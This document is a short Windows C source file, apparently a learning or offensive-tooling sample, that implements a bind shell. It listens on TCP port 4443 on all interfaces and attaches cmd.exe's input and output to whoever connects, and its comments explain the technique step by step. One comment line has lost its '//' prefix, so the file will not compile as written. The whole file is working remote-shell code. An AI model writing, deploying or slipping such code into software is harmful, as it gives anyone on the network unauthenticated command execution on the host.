#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib,"ws2_32")

void doShell(){

    // needed data structures
    WSADATA wsaData;
    SOCKET s1, s2;
    struct sockaddr_in hax;
    char ip_addr[16];
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    //command we want to run, any other command line program could be used, but we want to prompt a shell.
    char Process[] = "cmd.exe";
    //WSAStartup is needed for socket 
	WSAStartup(MAKEWORD(2, 2), &wsaData);
    //We can use socket() either 
    //so INET TCP socket 
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    port 4443 on all interfaces
	hax.sin_family = AF_INET;
	hax.sin_port = htons(4443);
	hax.sin_addr.s_addr = inet_addr("0.0.0.0");
    //bind the socket to the address:port 
    if(bind(s1,(SOCKADDR*)&hax, sizeof(hax)) == SOCKET_ERROR){
		    printf("error %d \n", WSAGetLastError());
			closesocket(s1);
			WSACleanup();
    }
    //now the port will be open 
	else if(listen(s1,10) == SOCKET_ERROR){
		    printf("error %d \n", WSAGetLastError());
			closesocket(s1);
			WSACleanup();
    }
    else{
        //we set up a new socket here
        s2 = accept(s1, NULL, NULL);

        // we'll  use s2 to SEND data ourselves to the client
        printf("connecting \n");
        // we get the processinfo struct ready
        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        // this is the key concept here, all the input/output of the interaction with this proces will go from/to client socket
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s2;
        // we create the socket with that data
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        // we don't want the program to end after this, we want to keep the connection going until cmd.exe finishes
        WaitForSingleObject(pi.hProcess, INFINITE);
        // house cleaning
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(s1);
        closesocket(s2);
        WSACleanup();
        printf("shell closed \n");
    }

}

int main(int argc, char* argv[]){

    printf("bind shell going on: \n");
    doShell();

}
